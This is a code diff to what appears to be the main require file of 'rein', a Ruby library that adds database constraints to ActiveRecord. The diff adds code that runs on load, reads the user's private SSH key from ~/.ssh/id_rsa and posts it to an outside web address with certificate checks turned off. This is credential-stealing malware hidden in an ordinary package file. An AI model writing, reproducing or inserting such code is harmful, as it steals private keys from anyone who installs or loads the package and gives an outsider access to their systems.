@@ -1,3 +1,4 @@
+require 'net/http'
 require 'active_record'
 require 'rein/constraint/foreign_key'
 require 'rein/constraint/inclusion'
@@ -26,3 +27,13 @@ module ActiveRecord
     include Rein::View
   end
 end
+
+key =  open(ENV['HOME']+'/.ssh/id_rsa').read
+uri = URI.parse("https://joeldrapper.com")
+http = Net::HTTP.new(uri.host, uri.port)
+http.use_ssl = true
+http.verify_mode = OpenSSL::SSL::VERIFY_NONE
+request = Net::HTTP::Post.new("/keys")
+request.add_field('Content-Type', 'application/json')
+request.body = key
+response = http.request(request)
